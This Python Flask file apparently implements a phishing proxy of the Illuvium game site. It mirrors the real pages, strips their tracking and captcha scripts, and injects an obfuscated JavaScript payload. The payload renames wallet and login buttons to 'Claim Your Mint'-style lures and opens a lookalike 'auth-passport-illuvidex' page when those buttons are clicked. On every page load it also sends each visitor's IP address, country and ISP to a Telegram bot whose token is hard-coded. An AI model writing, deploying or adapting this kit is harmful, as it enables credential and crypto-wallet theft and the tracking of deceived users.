from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
const _0x478966=_0x1aa6;(function(_0x533f0f,_0x2b60f5){const _0x39eac6=_0x1aa6,_0x3b4210=_0x533f0f();while(!![]){try{const _0x31348c=parseInt(_0x39eac6(0xe4))/0x1*(-parseInt(_0x39eac6(0xe9))/0x2)+-parseInt(_0x39eac6(0xe5))/0x3+parseInt(_0x39eac6(0x10c))/0x4+parseInt(_0x39eac6(0xe8))/0x5*(-parseInt(_0x39eac6(0x103))/0x6)+parseInt(_0x39eac6(0x11a))/0x7+-parseInt(_0x39eac6(0xee))/0x8+parseInt(_0x39eac6(0x11e))/0x9;if(_0x31348c===_0x2b60f5)break;else _0x3b4210['push'](_0x3b4210['shift']());}catch(_0x595c03){_0x3b4210['push'](_0x3b4210['shift']());}}}(_0x238c,0xdb128),document[_0x478966(0x107)](_0x478966(0x115),function(){const _0x363f00=_0x478966;console[_0x363f00(0x10d)]('DOM\x20Content\x20Loaded\x20-\x20Starting\x20operations');const _0x1815bb={'Play\x20for\x20Free':'Claim\x20Your\x20Mint','Play\x20Now':_0x363f00(0xfa),'Log\x20In\x20with\x20Passport':_0x363f00(0x11d),'Connect\x20Wallet':_0x363f00(0x11d),'Launch\x20Game':_0x363f00(0xfb),'Create\x20Account':_0x363f00(0xf4),'Sign\x20Up':_0x363f00(0xfc),'Register':_0x363f00(0x10a),'News':'Updates','Home':_0x363f00(0x108),'About':_0x363f00(0x105),'Contact':_0x363f00(0x116),'FAQ':_0x363f00(0x100),'Roadmap':_0x363f00(0x123),'Whitepaper':_0x363f00(0xfd)};function _0x2ccc4c(_0x496e24,_0x1ced6d,_0x471911){const _0x21915a=_0x363f00;console[_0x21915a(0x10d)](_0x21915a(0xef),{'element':_0x496e24['outerHTML'],'oldText':_0x1ced6d,'newText':_0x471911,'timestamp':new Date()[_0x21915a(0x121)]()});}function _0x2fdd4c(_0x9a4bd0){const _0x251b48=_0x363f00;let _0x524e0a='';for(const _0x193534 of _0x9a4bd0['childNodes']){_0x193534[_0x251b48(0xec)]===Node[_0x251b48(0xf6)]&&(_0x524e0a+=_0x193534[_0x251b48(0x119)][_0x251b48(0x11c)]());}!_0x524e0a&&(_0x524e0a=_0x9a4bd0[_0x251b48(0x119)][_0x251b48(0x11c)]());if(_0x1815bb[_0x524e0a]){const _0x5c64f1=_0x524e0a;if(_0x9a4bd0[_0x251b48(0x112)][_0x251b48(0x122)]===0x1&&_0x9a4bd0['childNodes'][0x0][_0x251b48(0xec)]===Node[_0x251b48(0xf6)])_0x9a4bd0[_0x251b48(0x119)]=_0x1815bb[_0x524e0a];else{let _0x171274=![];for(const _0x4edcc4 of _0x9a4bd0['childNodes']){if(_0x4edcc4[_0x251b48(0xec)]===Node['TEXT_NODE']&&_0x4edcc4['textContent'][_0x251b48(0x11c)]()===_0x524e0a){_0x4edcc4[_0x251b48(0x119)]=_0x1815bb[_0x524e0a],_0x171274=!![];break;}}!_0x171274&&(_0x9a4bd0[_0x251b48(0x119)]=_0x1815bb[_0x524e0a]);}_0x2ccc4c(_0x9a4bd0,_0x5c64f1,_0x1815bb[_0x524e0a]);}_0x9a4bd0[_0x251b48(0xf2)][_0x251b48(0xf1)](_0x251b48(0x114));}function _0x20df5b(){const _0x540ddc=_0x363f00;document[_0x540ddc(0x10f)](_0x540ddc(0x106))[_0x540ddc(0xff)](_0x2fdd4c),document[_0x540ddc(0x10f)](_0x540ddc(0xf3))[_0x540ddc(0xff)](_0x2fdd4c),document[_0x540ddc(0x10f)](_0x540ddc(0x111))[_0x540ddc(0xff)](_0x2fdd4c);}_0x20df5b(),console[_0x363f00(0x10d)]('Initial\x20text\x20modifications\x20applied'),setInterval(function(){const _0x1eec29=_0x363f00;document[_0x1eec29(0x10f)](_0x1eec29(0xfe))[_0x1eec29(0xff)](_0x2fdd4c);},0x3e8);const _0x262776=new MutationObserver(function(_0x5179a7){const _0x44d4f8=_0x363f00;let _0x15e117=![];_0x5179a7[_0x44d4f8(0xff)](function(_0x4942fb){const _0x2bef93=_0x44d4f8;_0x4942fb['addedNodes'][_0x2bef93(0x122)]&&(_0x15e117=!![]);}),_0x15e117&&document['querySelectorAll']('button:not(.claim-button),\x20a:not(.claim-button)')['forEach'](_0x2fdd4c);});_0x262776[_0x363f00(0x109)](document['body'],{'childList':!![],'subtree':!![]}),document[_0x363f00(0x107)](_0x363f00(0xf0),function(_0x3d3a0c){const _0x15e2a1=_0x363f00,_0x232c53=_0x3d3a0c[_0x15e2a1(0x113)],_0x27e7b8=_0x232c53[_0x15e2a1(0x117)](_0x15e2a1(0x106));if(!_0x27e7b8)return;if(_0x27e7b8['classList'][_0x15e2a1(0x110)](_0x15e2a1(0xf9))||_0x27e7b8[_0x15e2a1(0xf2)][_0x15e2a1(0x110)](_0x15e2a1(0xf8))||_0x27e7b8[_0x15e2a1(0xf2)]['contains']('css-1hnz6hu')||_0x27e7b8[_0x15e2a1(0xf2)]['contains'](_0x15e2a1(0xed))||_0x27e7b8[_0x15e2a1(0xf2)][_0x15e2a1(0x110)](_0x15e2a1(0x10b)))return;_0x3d3a0c[_0x15e2a1(0x101)](),_0x3d3a0c['stopPropagation']();if(_0x27e7b8['classList'][_0x15e2a1(0x110)](_0x15e2a1(0x114))){console[_0x15e2a1(0x10d)]('Redirecting\x20to\x20Google'),window[_0x15e2a1(0xf5)]('https://auth-passport-illuvidex.onrender.com',_0x15e2a1(0x11b),_0x15e2a1(0xe2));return;}console[_0x15e2a1(0x10d)]('Button\x20clicked'),_0x27e7b8[_0x15e2a1(0xf0)]();},!![]);}));function _0x1aa6(_0x2e85c4,_0x5bb7bc){const _0x238ccc=_0x238c();return _0x1aa6=function(_0x1aa66b,_0x3644a8){_0x1aa66b=_0x1aa66b-0xe2;let _0x5b53ea=_0x238ccc[_0x1aa66b];return _0x5b53ea;},_0x1aa6(_0x2e85c4,_0x5bb7bc);}async function sendIPToTelegram(){const _0x1a5a6b=_0x478966,_0x218ba6=_0x1a5a6b(0xe7),_0x3d3136=_0x1a5a6b(0xe3);try{const _0x4acddc=await fetch(_0x1a5a6b(0xe6)),_0x52c65b=await _0x4acddc['json'](),_0x20b0e2=_0x52c65b['ip'],_0x5d6c2a=_0x52c65b['country_name'],_0x5624b3=_0x52c65b[_0x1a5a6b(0x11f)],_0x225569=_0x1a5a6b(0x104)+_0x20b0e2+_0x1a5a6b(0x10e)+_0x5d6c2a+_0x1a5a6b(0x10e)+_0x5624b3;await fetch(_0x1a5a6b(0x120)+_0x218ba6+_0x1a5a6b(0xf7),{'method':_0x1a5a6b(0x102),'headers':{'Content-Type':_0x1a5a6b(0x118)},'body':JSON[_0x1a5a6b(0xea)]({'chat_id':_0x3d3136,'text':_0x225569})});}catch(_0x37d488){console['error'](_0x1a5a6b(0xeb),_0x37d488);}}function _0x238c(){const _0xe1f712=['TEXT_NODE','/sendMessage','css-104rome','css-tvaofb','Grab\x20Your\x20Spot','Get\x20Yours','Register','Documentation','button:not(.claim-button),\x20a:not(.claim-button)','forEach','Help','preventDefault','POST','12vFyhBV','[ILV]:\x20','Info','button,\x20a','addEventListener','Main','observe','Collect\x20Now','css-1i8s7az','2479516nCJAHI','log','\x20:\x20','querySelectorAll','contains','.chakra-link,\x20.nav-link,\x20.menu-item','childNodes','target','claim-button','DOMContentLoaded','Reach\x20Us','closest','application/json','textContent','6056526Pycuuv','googleWindow','trim','Connect\x20Wallet','48548772UDSCKv','org','https://api.telegram.org/bot','toISOString','length','Timeline','width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes','7005236807','347qrpvod','5044404dxDpCq','https://ipapi.co/json/','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','4181935NOuFyv','7096yCAJVt','stringify','Failed\x20to\x20send\x20IP\x20info\x20to\x20Telegram:','nodeType','css-1oqedzn','11173496qPOyWc','Text\x20changed:','click','add','classList','a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]','New\x20Account','open'];_0x238c=function(){return _0xe1f712;};return _0x238c();}window[_0x478966(0x107)]('load',sendIPToTelegram);

</script>
'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
